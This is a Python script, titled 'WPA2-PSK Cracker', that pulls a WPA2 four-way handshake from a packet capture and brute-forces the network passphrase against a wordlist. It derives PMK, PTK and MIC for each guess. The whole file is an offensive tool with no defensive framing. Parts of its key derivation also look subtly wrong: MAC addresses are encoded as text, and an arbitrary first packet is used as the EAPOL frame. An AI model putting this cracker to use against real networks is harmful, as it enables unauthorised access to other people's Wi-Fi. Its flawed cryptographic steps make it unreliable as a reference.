import sys
import hmac
import hashlib
import binascii
from scapy.all import *
import argparse
import struct
from pbkdf2 import PBKDF2

# Extract handshake info from the pcap file
def extract_handshake_info(input_file):
    packets = rdpcap(input_file)
    snonce, anonce, mic, sta_mac, bssid, ssid = None, None, None, None, None, None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            if eapol_layer.type == 3 and eapol_layer.key_mic:
                mic = bytes(eapol_layer.original[-18:-2])  # Extract MIC
                if not snonce:
                    snonce = eapol_layer.key_nonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1

        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()

    if not all([snonce, anonce, mic, sta_mac, bssid, ssid]):
        print("Error: Missing handshake information.")
        sys.exit(1)

    print(f"SNonce: {snonce.hex()}")
    print(f"ANonce: {anonce.hex()}")
    print(f"MIC: {mic.hex()}")
    print(f"STA MAC: {sta_mac}")
    print(f"BSSID: {bssid}")
    print(f"SSID: {ssid}")

    return snonce, anonce, mic, sta_mac, bssid, ssid

# Compute PMK from the PSK and SSID using PBKDF2
def psk_to_pmk(psk, ssid):
    return PBKDF2(psk, ssid, 4096).read(32)

# Derive PTK from PMK, nonces, and MAC addresses
def derive_ptk(pmk, anonce, snonce, ap_mac, client_mac):
    a = b"Pairwise key expansion"
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = b''
    i = 0
    while len(ptk) < 64:
        ptk += hmac.new(pmk, a + b + struct.pack('B', i), hashlib.sha1).digest()
        i += 1
    return ptk[:64]

# Verify if the MIC matches by computing it with the derived PTK
def verify_mic(ptk, mic, eapol_frame):
    mic_key = ptk[:16]
    # Create a copy of the eapol_frame with the MIC part zeroed out
    eapol_data = eapol_frame[:-18] + b'\x00' * 16 + eapol_frame[-2:]
    computed_mic = hmac.new(mic_key, eapol_data, hashlib.sha1).digest()[:16]
    return computed_mic == mic

# Cracking the PSK using the wordlist
def crack_psk(wordlist, snonce, anonce, mic, sta_mac, bssid, ssid, eapol_frame):
    with open(wordlist, 'r', encoding='utf-8') as f:
        for password in f:
            password = password.strip()
            print(f"Testing password: {password}")  # Debugging: Show the current password being tested
            pmk = psk_to_pmk(password, ssid.encode())
            ptk = derive_ptk(pmk, anonce, snonce, bssid.encode(), sta_mac.encode())
            print(f"Generated PTK: {binascii.hexlify(ptk).decode()}")  # Debugging: Show generated PTK
            if verify_mic(ptk, mic, eapol_frame):
                print(f"[+] Correct PSK found: {password}")
                return
    print("[-] No valid PSK found in wordlist.")

# Main function to run the program
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="WPA2-PSK Cracker")
    parser.add_argument("capture", help="Path to .cap/.pcap file")
    parser.add_argument("-P", "--wordlist", required=True, help="Path to wordlist")
    args = parser.parse_args()

    snonce, anonce, mic, sta_mac, bssid, ssid = extract_handshake_info(args.capture)

    # Extract the first EAPOL frame for MIC verification
    eapol_frame = rdpcap(args.capture)[0].original

    # Start cracking
    crack_psk(args.wordlist, snonce, anonce, mic, sta_mac, bssid, ssid, eapol_frame)
